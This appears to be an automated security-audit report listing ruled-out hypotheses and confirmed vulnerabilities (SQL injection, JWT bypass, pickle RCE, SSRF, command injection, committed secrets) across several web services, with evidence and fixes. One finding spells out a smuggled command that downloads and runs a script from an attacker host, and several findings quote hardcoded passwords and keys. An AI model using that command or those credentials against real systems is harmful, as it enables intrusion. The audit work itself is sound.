stages_skipped: mantis-history: target has no VCS metadata (git rev-parse fails in corpus-v4), so there is no history to mine for past fixes; vcs_type recorded as 'none'.

mantis-structural-index: no SCIP/Kythe/compiler/ctags backend available offline; the skill declares the index HINT-only and degrades to grep, which is what the researcher stage used (exhaustive read of all 53 files).

mantis-reproduce: no PHP, .NET, Rust, Python/Celery or Node runtime and no database available offline, so no PoC could be executed; per the reporter contract every finding is therefore evidence-based static triage, and none is claimed as dynamically reproduced.
mantis-patch: the task forbids modifying anything under TARGET and the patch stage writes fixes plus .bak files into the code root; recommendations are given in text instead.

snapshot pinning (--sync): run in MODE-OFF per the meta-agent default, so active_snapshot is absent, discovery_commit is omitted, and the Snapshot Provenance Gate in mantis-review was bypassed as specified for SNAPSHOT MODE OFF.

sub-agent wave parallelisation in mantis-researcher: harness caps concurrency, so the documented sequential fallback ('If sub-agents or concurrency are not supported, fall back to performing the sweeps and deep-dives sequentially') was used.

fp_rule_map.note: FP-nn labels are the 13 negative constraints of mantis-review Step 3, in skill order. 'answer' records whether the false-positive rule fires against the finding: HOLDS = the rule applies (for FP-08 that means the intrinsic-flaw carve-out keeps the finding; for FP-03 it means the finding is not dynamically reproducible and is reported as probable), DOES_NOT_HOLD = the rule was checked and does not kill the finding.

ruled_out.assertion: Second-order SQL injection via the `days` aging parameter
ruled_out.killed_by: `(int)` cast at line 71 makes the interpolated value an integer before it reaches the interval literal; the mitigation is real and complete.

ruled_out.assertion: SQL injection via the `sort`/`dir` order-by fragment
ruled_out.killed_by: Invoice::sortColumn (Invoice.php:54) whitelists against SORTABLE with in_array strict, and $dir is a two-valued ternary; both mitigations verified in source.

ruled_out.assertion: Command injection in the wkhtmltopdf invocation
ruled_out.killed_by: $template is checked with array_key_exists against a constant map (line 27), $layout and $source are escapeshellarg'd, and $target is built with %d from an integer id.

ruled_out.assertion: HMAC bypass in the payment webhook signature check
ruled_out.killed_by: hash_hmac over `t.body` compared with hash_equals (constant time) plus a 300s replay window; parseHeader has no exploitable duplicate-key or type-juggling path.

ruled_out.assertion: Path traversal in the firmware channel directory
ruled_out.killed_by: `channel` is bound to the FirmwareChannel enum, so a traversal segment cannot bind; ToString() can only yield an enum name or a numeric literal.

ruled_out.assertion: Hardcoded JWT signing key in appsettings.json
ruled_out.killed_by: Documented RFC 7515 A.1 example under the key name FixtureSigningKey; the code reads Jwt:SigningKey (TokenService.cs:20,41), so this literal is a test fixture, not a live secret.

ruled_out.assertion: Mass assignment of IsFactoryUnlocked on device registration
ruled_out.killed_by: The DeviceRegistration record exposes only Serial and Model (line 117); IsFactoryUnlocked is never bound from the body, so the claimed sink does not exist.

ruled_out.assertion: Negative page parameter causes a server error in device listing
ruled_out.killed_by: Unvalidated `page` yields a negative Skip and an exception; availability-only, and the module is not a DoS-defence component.

ruled_out.assertion: SQL injection via window_hours in the evaluation series
ruled_out.killed_by: The value is typed i64 by the axum Path extractor and clamped to 1..=720 at routes.rs:96 before reaching the format!.

ruled_out.assertion: Cross-tenant read via load_flag's unscoped primary-key lookup
ruled_out.killed_by: Every caller obtains the id from flag_id_for_key, which filters on tenant_id (store.rs:37); the claim requires hypothesising a caller that does not exist.

ruled_out.assertion: Authentication bypass from building the decoding key out of the issuer URL
ruled_out.killed_by: DecodingKey::from_rsa_pem over the issuer string cannot parse, so caller() returns 500 for every request. A genuine defect, but it fails closed -- no bypass, availability only.

ruled_out.assertion: Permissive CORS on the probe routes
ruled_out.killed_by: AllowOrigin::any() is attached only to /healthz and /buildinfo, carries no credentials, and returns no tenant data.

ruled_out.assertion: SQL injection via the queue parameter on the kanban board
ruled_out.killed_by: `int(request.GET.get('queue', 0))` at line 74 coerces before interpolation; the organisation filter is separately parameterised as %s.

ruled_out.assertion: Command injection in the attachment virus scan
ruled_out.killed_by: stored_path (models.py:84) is composed of a server-generated uuid hex and an extension restricted to ALLOWED_EXTENSIONS by AttachmentForm.clean_file (forms.py:28); no request-controlled text reaches the command line.

ruled_out.assertion: Unauthenticated access to the CSV export view
ruled_out.killed_by: ticket_export lacks @login_required but LoginRequiredMiddleware (settings.py:51) refuses anonymous requests to every path outside PUBLIC_PATHS, and /tickets/export/ is not listed.

ruled_out.assertion: Auth bypass through the LoginRequiredMiddleware prefix match
ruled_out.killed_by: startswith matching does admit sibling prefixes such as /healthz*, but no URL pattern in config/urls.py resolves under any such string, so no reachable route is exposed.

ruled_out.assertion: SQL injection in account_balance_at's dynamic statement
ruled_out.killed_by: p_account_id is declared bigint, so the concatenated text can only contain digits; the date is passed with USING. Flagging the EXECUTE alone would be linting a safely typed parameter.

ruled_out.assertion: ledger_app can tamper with the audit log through its table grants
ruled_out.killed_by: audit_log has RLS enabled and forced (002_rls.sql:12,18) with only SELECT and INSERT policies defined; UPDATE and DELETE match no policy and are therefore denied despite the grant.

ruled_out.assertion: Hardcoded SCRAM verifiers in the pgbouncer userlist
ruled_out.killed_by: Documented throwaway sample; provision.sh:101-105 writes the live /etc/pgbouncer/userlist.txt from the secret store and never copies this file.

ruled_out.assertion: Unsafe rm -rf on an unvalidated argument in reset_dir
ruled_out.killed_by: Both call sites (lines 37 and 120) pass the STAGE_DIR constant; the finding requires hypothesising a caller that does not exist in the script.

ruled_out.assertion: SQL injection through the interpolated LIMIT clause
ruled_out.killed_by: No ingress reaches it untyped: the only call site is recentNotes, where zod coerces limit to an int bounded 1..200 (app/actions/notes.ts:18) before listNotes is called.

ruled_out.assertion: Stored XSS through dangerouslySetInnerHTML on note.html
ruled_out.killed_by: renderNoteHtml uses markdown-it with html:false, and the link_open rule restricts hrefs to http/https/mailto (lib/policy.ts:34-64); the sanitiser is a working mitigation.

ruled_out.assertion: SSRF through the share target URL
ruled_out.killed_by: isAllowedShareTarget enforces https and an exact hostname match against a build-time allowlist (lib/policy.ts:13-27). The primary class is blocked, so asserting SSRF here would be stretching past a working mitigation.

ruled_out.assertion: Auth bypass through the middleware PUBLIC_PREFIXES match
ruled_out.killed_by: startswith admits siblings of /shared and /legal, but no route in the app tree resolves under such a path, so nothing protected becomes reachable.

findings.title: SQL injection in the invoice type-ahead search
findings.evidence: `$term = trim($request->query('q', ''))` (line 47) is interpolated straight into the raw statement passed to DB::select: "... and (number like '%{$term}%' or notes like '%{$term}%') ..." (line 57). Only account_id is bound as a parameter (line 60). The sibling queries in the same class either whitelist (index(), via Invoice::sortColumn) or cast to int (aging()), so this is the one raw path where a string reaches the SQL text.
findings.impact: Any signed-in customer can append arbitrary SQL to a query executed with the portal's database role: read invoices, accounts and password_reset rows belonging to other tenants, or write through the same connection.
findings.recommendation: Bind the term: `where number like ? or notes like ?` with `['%'.$term.'%', ...]`, or move the search to the query builder's `where(...,'like',...)`.

triage.reason: Ingress is cited: billing-portal/app/Http/Controllers/InvoiceController.php:47 reads the `q` query parameter from the HTTP request and it reaches the sink at line 57 unmodified.
There is no mitigation to credit: trim() removes whitespace only, and the parameter array covers account_id, not the interpolated term.
Not paranoia about a safe API -- the class uses parameterised DB::select elsewhere and abandons it here.

findings.title: Invoice detail view is not scoped to the caller's account
findings.evidence: show() calls `Invoice::with('account')->findOrFail($id)` on the route-supplied id with no tenant predicate. update() (line 101) and download() (line 113) in the same controller both start from `Invoice::where('account_id', $request->user()->account_id)`, so the missing scope in show() is a deviation from the file's own pattern, not an absent convention. The route is inside the `auth` middleware group (routes/web.php:40) but that only proves the caller is signed in.
findings.impact: Any authenticated customer can enumerate invoice ids and read other tenants' invoices, including the eager-loaded Account relation (billing contact, address, identifiers).
findings.recommendation: Scope the lookup the way the neighbouring actions do: `Invoice::where('account_id', $request->user()->account_id)->findOrFail($id)`, or attach a policy via authorize('view', $invoice).

triage.reason: Ingress is the `{id}` route segment bound at routes/web.php:40 and passed to the sink at line 87.
This is not a caller misusing a safe function; the controller action itself is the trust boundary and it omits the check.
The only control present is `auth` (authentication). No authorization mitigation exists to be credited.

findings.title: Mass assignment: forceFill($request->all()) overwrites guarded invoice columns
findings.evidence: `$invoice->forceFill($request->all())->save()`. Invoice declares `$fillable` (Invoice.php:21) and `$guarded = ['account_id','total_cents','paid_at','credit_applied_cents']` (Invoice.php:29), but forceFill is Eloquent's documented escape hatch: it bypasses both lists. The whole unfiltered request body is written.
findings.impact: A customer can PATCH /invoices/{id} with paid_at, total_cents or credit_applied_cents and mark their own invoice settled, zero its balance, or move it to another account_id -- direct financial impact with no further access needed.
findings.recommendation: Use `$invoice->fill($request->validate([...]))` restricted to the editable fields (number, status, due_at, notes, po_reference); reserve forceFill for trusted server-side writes.

triage.reason: Ingress is `$request->all()` at line 104 -- the entire attacker-controlled request body is the tainted source.
The $guarded declaration looks like a mitigation but forceFill is specified to ignore it, so crediting it would be exactly the hallucinated-mitigation error this rule warns about.
The unsafe call is in production controller code, not a hypothetical caller.

findings.title: CORS allows any origin while carrying credentials
findings.evidence: `'allowed_origins' => ['*']` (line 28) combined with `'supports_credentials' => true` (line 38) over `paths => ['api/*','sanctum/csrf-cookie']` (line 19). Laravel's HandleCors delegates to Symfony's CorsService, which -- when credentials are supported -- cannot emit a literal `*` and instead reflects the request Origin. The in-file comment ("Echoing whatever the browser sends") states the intended behaviour outright.
findings.impact: Any web page a signed-in customer visits can issue credentialed cross-origin requests to the portal API and read the responses: invoice lists, search results, aging data.
findings.recommendation: Replace the wildcard with the tenant vanity domains resolved at request time (allowed_origins_patterns or a callback backed by the tenant table). Never pair a reflected origin with supports_credentials unless the origin was checked against an allowlist.

triage.reason: This is not a missing hardening header. An affirmative CORS grant plus credentials is the control that authorises cross-origin reads; it is broken, not absent.
No compensating control exists in the config: allowed_origins_patterns is empty (line 30) and same_site is 'none' (line 70), so the session cookie does ride along.
This is a configuration weakness, not a data-flow finding; rule 13's ingress-citation requirement does not apply.

findings.title: Application encryption key falls back to a committed literal
findings.evidence: `'key' => env('APP_KEY', 'base64:c2FtcGxlLWtleS1mb3ItYmlsbGluZy1wb3J0YWwtMDE=')`. The fallback decodes to the 32-byte ASCII string 'sample-key-for-billing-portal-01', a valid AES-256-CBC key, so an environment that never sets APP_KEY boots successfully and silently on a key that is public in the repository. config/security.php sets `'encrypt' => true` on sessions (line 50) and signed URLs use the same key (line 74).
findings.impact: Anyone holding the repository can decrypt and forge encrypted session cookies, mint valid signed URLs, and decrypt any cookie or payload protected by APP_KEY -- full authentication bypass in any deployment that relies on the default.
findings.recommendation: Drop the second argument so the framework raises on a missing APP_KEY, and rotate the key in any environment that may have booted on the default.

triage.reason: Rule 08 (intrinsic flaws) is the reason this is kept: a hardcoded static secret is valid on its own terms regardless of which call sites read it.
Not a mock database or a local-only test fixture -- config/app.php is the production configuration file and the comment describes it as a convenience for real boots.
Path and line verified against the snapshot; the literal is present at config/app.php:52.

findings.title: Debug mode defaults to on in the production config
findings.evidence: `'debug' => (bool) env('APP_DEBUG', true)` while `'env' => env('APP_ENV', 'production')` on line 15. Failing open means any host that does not explicitly set APP_DEBUG=false serves Laravel's Ignition error page. The comment justifies it as a support workflow.
findings.impact: Unhandled exceptions expose stack traces, source excerpts and the resolved environment -- including database credentials and APP_KEY -- to whoever triggers the error.
findings.recommendation: Default to false: `env('APP_DEBUG', false)`; give support a redacted correlation id instead of the exception page.

triage.reason: Not a missing header: an enabled debug handler actively publishes secrets, which is a disclosure sink rather than absent defence in depth.
Trivially triggerable and repeatable -- any request that raises an exception renders the page; no timing or unusual environment is required.
The file is neither a test nor an example path.

findings.title: Session cookie hardening disabled: HttpOnly off, Secure off, SameSite none
findings.evidence: `'http_only' => false` (line 62), `'secure' => false` (line 68) and `'same_site' => 'none'` (line 70) on the 'billing_session' cookie that carries the authenticated session. The comments justify each: the PDF viewer reads document.cookie, and the edge redirects :80 to https.
findings.impact: HttpOnly off turns any reflected or stored XSS into full session theft. Secure off means the cookie is attached to the first plaintext request before the 301 is followed, exposing it on the wire; SameSite=None without Secure is additionally rejected outright by current browsers, so the deployment is both weaker and unreliable.
findings.recommendation: Set http_only and secure to true and same_site to 'lax'; give the PDF worker its own short-lived token instead of reading the session id from JavaScript.

triage.reason: Rule 02 covers missing hygiene headers. These are explicit downgrades of flags on the primary authentication credential, decided in config, not omissions.
The claimed mitigation (edge 301 to https) does not protect the first request, which is where the cookie leaks.
code_paths narrowed to the three flag lines in config/security.php; no callers or templates included.

findings.title: Legacy reset token built from md5 of predictable inputs
findings.evidence: `substr(md5($user->email . microtime() . mt_rand()), 0, 24)`. mt_rand is a non-cryptographic Mersenne Twister and microtime is guessable within a narrow window; md5 truncated to 96 bits then compounds it. The live path (sendResetLink, line 65) correctly uses `bin2hex(random_bytes(32))`, so this is the retained old format.
findings.impact: If any mailed link still carries this format, an attacker who requests a reset for a victim can brute-force the small effective keyspace and take over the account.
findings.recommendation: Delete the method; if the migration still needs it, expire the outstanding legacy links rather than keeping the generator in the tree.

triage.reason: Kept solely under rule 08: a broken primitive (md5 + mt_rand) used to mint a security token is an intrinsic flaw and stays VALID even with no live caller in the snapshot.

Not in a test or example path -- it sits in the production AuthController; but no caller was found, so the critic stage rated it CONDITIONAL rather than fully viable, which is why status is probable not confirmed.
Reproducibility depends on whether unexpired legacy links exist in the deployment, which is not observable from the snapshot.

findings.title: JWT signature validation replaced by a stub that accepts any token
findings.evidence: `SignatureValidator = (token, _) => new JwtSecurityToken(token)` -- the delegate parses the token and returns it without ever verifying the signature against IssuerSigningKey (which is built two lines above and then never consulted). Supplying a SignatureValidator overrides the handler's own signature check entirely. These parameters are the ones wired into AddJwtBearer at Program.cs:24, and Program.cs:31 makes an authenticated user the fallback policy for every endpoint.
findings.impact: Anyone can mint an unsigned JWT with arbitrary claims -- tenant_id of any tenant, role=fleet-admin -- and obtain full cross-tenant access, including the [Authorize(Policy="fleet-admin")] firmware promotion endpoint. Issuer and audience checks do not help: both values are non-secret and are in appsettings.
findings.recommendation: Delete the SignatureValidator assignment and let the handler validate against IssuerSigningKey, or wire a proper JWKS-backed IssuerSigningKeyResolver with caching if the cold-start fetch was the concern.

triage.reason: Ingress is the Authorization header parsed by the JwtBearer middleware registered at Program.cs:21-25; the attacker fully controls the token bytes.
The remaining checks (issuer, audience) are not mitigations against forgery because they validate attacker-supplied claims against public constants.
No fix is under review here; the primary flaw class -- signature verification -- is the one asserted and it is unblocked.

findings.title: SQL injection in device serial search via FromSqlRaw with an interpolated string
findings.evidence: `FromSqlRaw($"SELECT TOP 25 * FROM devices WHERE tenant_id = {TenantId} AND serial LIKE '%{q}%' ORDER BY serial")`. FromSqlRaw takes a plain string, so the C# interpolation is performed before the call and `q` -- bound from the query string at line 45 -- becomes literal SQL. The parameterising sibling (FromSql / FromSqlInterpolated, which take FormattableString) is not used.
findings.impact: A signed-in caller can break out of the LIKE literal and read or modify any table reachable by the application's SQL Server login, across every tenant.
findings.recommendation: Switch to `FromSql($"... serial LIKE {'%' + q + '%'}")` (FormattableString overload) or pass an explicit SqlParameter; keep FromSqlRaw only for constant SQL.

triage.reason: Ingress cited: [FromQuery] string q at fleet-api/Controllers/DevicesController.cs:45 flows unmodified into the statement at line 54.
Not pedantry about a safe API -- FromSqlRaw with a pre-interpolated string is the documented unsafe overload, and the file uses safe LINQ everywhere else.
The IsNullOrWhiteSpace guard at line 47 only rejects empty input; it does not sanitise.

findings.title: Device retirement endpoint is anonymous and unscoped
findings.evidence: `[AllowAnonymous]` on `[HttpDelete("{id:long}")] Retire(long id)`, and the lookup on line 102 is `FirstOrDefaultAsync(d => d.Id == id)` with no tenant predicate -- unlike List (line 31) and Stats (line 68), which both filter on TenantId. Program.cs:31 sets an authenticated fallback policy, and AllowAnonymous is precisely the opt-out that defeats it (Program.cs:27-28 says so).
findings.impact: An unauthenticated attacker who can reach the API can retire any device in any tenant by iterating ids -- a denial of service against the fleet with no credentials at all.
findings.recommendation: Remove [AllowAnonymous], scope the query to the caller's tenant, and let the console retry after the SSO hop rather than opening the endpoint.

triage.reason: Ingress is the route id segment on an endpoint reachable without any credential; attacker control is total.
The endpoint itself performs the destructive write; no hypothetical caller is involved.
The global fallback policy would have covered this endpoint; the attribute explicitly disables it, so there is no surviving mitigation.

findings.title: Production JWT config disables expiry and sets a 24-hour clock skew
findings.evidence: `"ValidateLifetime": false` (line 15) and `"ClockSkewMinutes": 1440` (line 16) in the production settings file; TokenService.BuildValidationParameters reads both (lines 29-30). The development appsettings.json keeps ValidateLifetime true, so this is a deliberate production-only relaxation, justified in the adjacent _note as a telemetry-replay workaround.
findings.impact: A token captured from a gateway, a log or a backup stays valid forever; there is no expiry-based revocation path. The 1440-minute skew would still grant a full day of grace even if lifetime validation were restored.
findings.recommendation: Re-enable lifetime validation and solve the offline-buffer case at the payload layer (sign each telemetry batch, or accept a token whose exp covers the batch's own timestamp) rather than by disabling expiry for every caller.

triage.reason: Turning off expiry validation weakens the token verifier itself; it is not a missing hardening header.
appsettings.Production.json is the production configuration, traced to its consumer at fleet-api/Services/TokenService.cs:29.
Deterministic: an expired token is accepted on every request.

findings.title: Production database password committed in appsettings.Production.json
findings.evidence: `"Fleet": "Server=sql-fleet-prod.internal,1433;Database=Fleet;User Id=fleet_app;Password=Fl33tSvc-2024-prod;..."`. The value names a production host and a live-looking credential, and FleetApi.csproj:24-26 copies this file to the output directory, so it ships inside the build artifact. The project already has a UserSecretsId (csproj:8) and the Jwt signing key is kept out of the file, which shows the intended pattern was available and not followed here.
findings.impact: Anyone with repository or artifact access obtains a working login to the production fleet database.
findings.recommendation: Move the connection string to the environment or a secret store, rotate the password, and scrub it from history.

triage.reason: Rule 08 keeps this: a hardcoded static secret is valid independently of any call site.
Not a mock database -- the host name, the .Production filename and the csproj copy step all indicate a real deployment credential.
Verified in the snapshot at line 9 of the named file.

findings.title: Legacy gateway keys are matched by unsalted MD5 with a non-constant-time compare
findings.evidence: `MD5.HashData(...)` over the presented key with no salt or KDF (line 39), compared with `digest == expected` inside a loop over the configured keys (line 46). MD5 of a secret is trivially reversible from rainbow tables for anything short, and ordinary string equality is not constant time.
findings.impact: An attacker who obtains the LegacyKeys configuration recovers the gateway keys; the comparison also leaks a timing side channel across the key set.
findings.recommendation: If the scheme must stay in the tree, hash with a salted KDF and compare with CryptographicOperations.FixedTimeEquals -- or delete the handler now that the hardware is recalled.

triage.reason: Rule 08 is the only reason this survives triage: MD5 is a fundamentally broken choice here, which the rule keeps VALID even with no live caller.

Not a test path, but tracing shows the scheme is never registered -- Program.cs:21-25 adds only the JwtBearer scheme -- so the critic stage rated it NON_VIABLE in the current build. Reported at low severity and probable status for that reason.
Not reproducible as a live authentication bypass in this build because the handler is unreachable; the finding stands as an intrinsic weakness, not a triggerable one.

findings.title: Production MQTT broker configured without TLS
findings.evidence: `"TlsRequired": false` with `"BrokerUri": "tcp://mqtt-fleet-prod.internal:1883"` and a `"Username": "fleet-api"` (lines 20-23), against `tls://broker.localhost:8883` with TlsRequired true in the development appsettings.json (lines 21-22). The adjacent _note justifies it by VPC placement and un-reflashed gateway CA bundles. MQTTnet.AspNetCore is referenced at FleetApi.csproj:18.
findings.impact: Fleet telemetry and the broker credential cross the network in cleartext, readable and modifiable by anything sharing the subnet; there is also no server authentication, so a broker impersonation attack is unblocked.
findings.recommendation: Require TLS on the broker link and stage the gateway CA rollout separately; 'same VPC' is not a confidentiality boundary.

triage.reason: Disabling transport encryption for a credentialed channel is a broken control, not a missing defence-in-depth header.

The configuration keys exist exactly as cited, but no consuming code for the Mqtt section is present in the snapshot -- the reviewer therefore recorded UNKNOWN on end-to-end reachability and the finding is reported as probable, not confirmed.
Configuration weakness rather than a tainted data flow.

findings.title: Admin privileges granted by an attacker-supplied request header
findings.evidence: `is_admin: elevated || data.claims.roles.iter().any(|r| r == admin_claim)` where `elevated` is read from the `X-Flags-Elevate` request header a few lines above (lines 50-54). The header is part of the same client request as the bearer token and is not authenticated in any way; nothing checks that the request actually came from the internal console proxy. routes.rs gates both privileged operations solely on this field (upsert line 112, archive line 138).
findings.impact: Any caller holding a valid token for any tenant sends `X-Flags-Elevate: true` and becomes an administrator: create and overwrite flags, force a 100% rollout, archive flags, and set the webhook_url that the service will then fetch.
findings.recommendation: Drop the header path. If the console must impersonate, have it mint a scoped token, or authenticate the proxy hop itself (mTLS or a signed header the edge strips from client traffic).

triage.reason: Ingress cited: edge-flags/src/auth.rs:51 reads the X-Flags-Elevate header directly off the inbound HeaderMap.
authenticate() is itself the authorization decision point; the flaw is in its own logic, not in a caller's misuse.
The surrounding JWT validation is genuine (RS256 pinned, issuer, audience, exp) but it is bypassed by the `||` -- the mitigation is real and simply not on this path.

findings.title: SQL injection in the flag search term
findings.evidence: `format!("... AND (key ILIKE '%{term}%' OR description ILIKE '%{term}%') ORDER BY {} {} ...")` -- tenant_id is bound as $1 but `term` is formatted into the statement text. The ordering fragment really is safe (SortKey/SortDir are enums whose as_column/as_sql return &'static str), which makes the interpolated term the single unsafe element in the string.
findings.impact: Any authenticated caller can inject arbitrary SQL executed with the service's Postgres role: read every tenant's flags, or write through the same connection.
findings.recommendation: Bind the term: `... key ILIKE $2 ...` with `.bind(format!("%{}%", term))`. Keep the enum-derived ORDER BY fragment as it is.

triage.reason: Ingress cited: ListQuery.q is deserialised from the query string (edge-flags/src/routes.rs:53) and passed to search_flags at routes.rs:57.
The tenant_id bind and the enum-based ORDER BY are real mitigations and are credited -- neither covers the ILIKE literal.
code_paths narrowed to the sink line in store.rs; the routes.rs call site is cited as ingress evidence only.

findings.title: Webhook signatures are computed with an empty key when the secret is unset
findings.evidence: `let secret = std::env::var("FLAGS_WEBHOOK_SIGNING_KEY").unwrap_or_default();` -- a missing environment variable yields an empty String, and `HmacSha256::new_from_slice` accepts a zero-length key (the .expect comment acknowledges any key size is accepted), so signing proceeds silently. No other code path checks that the secret exists; the config file has no [webhooks] signing key entry either (config/default.toml:26-30).
findings.impact: If the variable is not set in an environment, every notification is signed with a key an attacker can guess, so consumers verifying X-Flags-Signature accept forged rollout events. The failure is silent -- delivery keeps working, so nothing surfaces the misconfiguration.
findings.recommendation: Read the secret once at startup and refuse to boot (or refuse to send) when it is absent; carry it in Settings alongside the other webhook options rather than reading the environment inside the signing function.

triage.reason: Deterministic and environment-observable: unset the variable and every signature becomes forgeable. No timing or race is involved.
The signature is the integrity control for the notification channel, not defence in depth; degrading it to a known key defeats the control itself.
The fail-open decision is inside sign() itself, not in a caller.

findings.title: Server-side request forgery through the flag-owned webhook URL
findings.evidence: `state.http.post(url)` (line 30) where `url` is `flag.webhook_url` (line 12), a free-text field written by the API caller through FlagUpsert (model.rs:72) and persisted verbatim by store::upsert_flag (store.rs:65). No scheme, host or address check exists anywhere between the upsert and the request; reqwest also follows redirects by default. The notification fires whenever rollout_percent reaches 100 (routes.rs:124), which the same caller controls.
findings.impact: A caller can make the service issue POSTs from inside the deployment network -- cloud instance metadata, admin ports on 127.0.0.1, unauthenticated internal services -- with a body the attacker partly controls. Combined with the X-Flags-Elevate escalation, no admin role is needed to reach it.
findings.recommendation: Validate webhook_url at upsert time against an https-only allowlist of registered hosts, resolve and reject private and link-local address ranges after DNS resolution, and disable redirect following on that client.

triage.reason: Ingress cited: FlagUpsert.webhook_url is deserialised from the request body at edge-flags/src/routes.rs:108 and stored by store.rs:65 before being fetched.
No mitigation is being reviewed here -- unlike notes-workspace, this service has no share-target allowlist, so this is the primary class rather than an invented adjacent one.
The claim is forged internal requests, not resource exhaustion; the retry loop is incidental to it.

findings.title: Docker socket mounted into the application container
findings.evidence: `- /var/run/docker.sock:/var/run/docker.sock` on the api service, which is the same container that terminates untrusted HTTP on 0.0.0.0:8080 (line 12) and holds the SQL injection and SSRF sinks above. The comment explains the rollout job shells out to `docker restart`.
findings.impact: Any code execution inside the api container -- or any command-injection style primitive reachable from it -- becomes root on the host: an attacker can start a privileged container mounting the host filesystem. It also collapses the isolation between this service and every other container on the host.
findings.recommendation: Remove the mount and drive restarts through a broker the api can only send scoped requests to (an orchestrator API with a restricted token, or a socket proxy limited to the restart verb on named containers).

triage.reason: docker-compose.yml is the deployment descriptor -- it pins a registry image and restart policy, so it is not a local-only developer fixture that can be waved off.
Granting host-daemon access is an affirmative privilege grant, not a missing hardening measure.
Escape from a container with the docker socket is a standard, fully automatable technique.

findings.title: Database password hardcoded in the compose environment
findings.evidence: `FLAGS__DATABASE__URL: postgres://flags:flags-svc-2024@db:5432/flags` on the api service (line 11) and repeated on the migrate service (line 46), while the db service in the same file takes its password from a Docker secret (`POSTGRES_PASSWORD_FILE`, lines 31-33). The file therefore contains both the correct pattern and the credential it was supposed to replace.
findings.impact: The database password is in the repository and in the environment of a container that is exposed on 0.0.0.0:8080; anyone reading the repo or inspecting the container obtains it.
findings.recommendation: Feed the URL from the same secret the db service uses (or a secret file read at boot) and rotate the password.

triage.reason: Rule 08 keeps hardcoded static secrets regardless of call sites.
Not a mock: the same value is used by the migrate service that runs against the real database.
Both occurrences verified at lines 11 and 46 of the cited file.

findings.title: Dead legacy webhook digest built on MD5
findings.evidence: `Md5::new()` hashing `tenant_id || payload` with no key (lines 58-65). Besides MD5 being broken, the construction is a bare digest rather than a MAC, so it authenticates nothing. It is marked `#[allow(dead_code)]` and the doc comment states no consumer remains; md-5 is still a declared dependency (Cargo.toml:27).
findings.impact: If any 0.3-era consumer is still verifying this digest, it can be forged by anyone who can guess the tenant id, since no secret is involved.
findings.recommendation: Delete the function and drop the md-5 dependency.

triage.reason: Rule 08 explicitly keeps a fundamentally broken algorithm even when nothing calls it; that is the sole basis for reporting this.
Not in a test or example path -- it is in the production module, though genuinely uncalled, which is why the critic stage rated it NON_VIABLE and the status here is probable.
No live trigger exists in this snapshot; the finding is intrinsic rather than reproducible.

findings.title: Remote code execution: pickle.loads on an attacker-controlled cookie
findings.evidence: `saved = pickle.loads(base64.b64decode(raw_cookie))` where raw_cookie is `request.COOKIES.get('hd_filters')` two lines above. The cookie is not signed, encrypted or version-checked -- Django's signing helpers are available but unused -- and the bare `except Exception` around it swallows evidence of tampering. Unpickling executes arbitrary Python by design via __reduce__.
findings.impact: Any user who can set a cookie on the helpdesk origin -- every signed-in agent, and anyone with an XSS or a subdomain foothold -- gets remote code execution in the web process, which holds the database credentials, the Celery broker and the attachment volume.
findings.recommendation: Store the layout as JSON (json.loads with a schema check), or use django.core.signing.loads so the value is authenticated. Never unpickle client-supplied data.

triage.reason: Ingress cited: helpdesk/tickets/views.py:48 reads the hd_filters cookie straight from the request into the sink at line 52.
The opposite of pedantry about a safe library: json.loads would be safe, and the code chose pickle.
The try/except is error handling, not a security control -- the payload has already executed by the time an exception could be raised.

findings.title: Command injection in the CSV export worker via the agent-supplied filename
findings.evidence: `subprocess.run(f"zip -j -q {dest} {tmp_path}", shell=True, check=True)` where `dest = os.path.join(settings.EXPORT_ROOT, filename + '.zip')` (line 40) and `filename` is the task argument passed from `request.GET.get('filename', ...)` at helpdesk/tickets/views.py:96, queued at views.py:98. Nothing quotes or validates it; the value keeps its shell metacharacters all the way into shell=True. The sibling task's docstring reasons about untrusted input for scan_attachment but the same reasoning was never applied here.
findings.impact: A signed-in agent supplies `?filename=x;curl attacker/s|sh` and executes arbitrary commands as the Celery worker, which mounts the shared attachment and export volumes. An absolute filename also escapes EXPORT_ROOT entirely, since os.path.join discards the prefix.
findings.recommendation: Drop shell=True and pass an argument list; validate the filename against a strict pattern and re-anchor it with os.path.basename before joining.

triage.reason: Ingress cited: helpdesk/tickets/views.py:96 reads the filename query parameter and views.py:98 hands it to the task that reaches the sink.
tasks.py is production worker code reached from a routed view (config/urls.py:16), not a harness.
The unsafe concatenation is inside the task itself; it does not depend on a caller behaving badly.

findings.title: Django SECRET_KEY falls back to a committed value
findings.evidence: `SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-hd-6f2b1c9a4d7e0b5318ca77e2049fbd6c')`. Any environment that does not set the variable boots on the committed key. SESSION_ENGINE is the cache backend (line 111) and Django derives session integrity, password-reset tokens, signed cookies and messages from SECRET_KEY.
findings.impact: Anyone with the repository can forge password-reset tokens and any signed value the application accepts, and can tamper with signed cookies -- an authentication bypass in any deployment relying on the default.
findings.recommendation: Fail closed: read the variable with no default so start-up raises when it is missing, and rotate the key wherever the default may have been active.

triage.reason: Kept under rule 08 as a hardcoded static secret, independent of call sites.
settings.py is the deployed configuration, not a mock or a local-only fixture.
Verified present at helpdesk/config/settings.py:21-24.

findings.title: DEBUG defaults to True
findings.evidence: `DEBUG = os.environ.get('DJANGO_DEBUG', '1') == '1'` -- the insecure value is the default, so a host that forgets the variable serves Django's debug page. ALLOWED_HOSTS (line 26) names a real deployment domain, confirming this file is used in production.
findings.impact: Django's technical 500 page discloses the settings module with SECRET_KEY and database credentials, local variables and source excerpts to whoever triggers an exception. It also disables ALLOWED_HOSTS enforcement.
findings.recommendation: Default to '0' so DEBUG is off unless explicitly enabled, and give agents a correlation id instead of the traceback page.

triage.reason: An enabled debug handler actively discloses secrets; that is a disclosure sink, not a missing header.
Any request that raises reproduces it.
Not a test or example path.

findings.title: Open redirect after sign-in through the unvalidated next parameter
findings.evidence: `return redirect(request.GET.get('next', settings.LOGIN_REDIRECT_URL))` immediately after login(). Django's own LoginView guards this with url_has_allowed_host_and_scheme; this hand-rolled view performs no host or scheme check, and django.shortcuts.redirect will happily emit an absolute external URL. The middleware feeds the parameter (tickets/middleware.py:18), so the shape is familiar to users.
findings.impact: A phishing link to the real helpdesk domain lands the victim on an attacker page immediately after a successful sign-in, when they are most likely to re-enter credentials or trust what they see.
findings.recommendation: Validate with `django.utils.http.url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()})` and fall back to LOGIN_REDIRECT_URL otherwise.

triage.reason: Ingress cited: the `next` query parameter is read at helpdesk/tickets/views.py:33 and used unfiltered as the redirect target.
Open redirect is a recognised flaw class with a concrete phishing outcome, not a missing hygiene header.
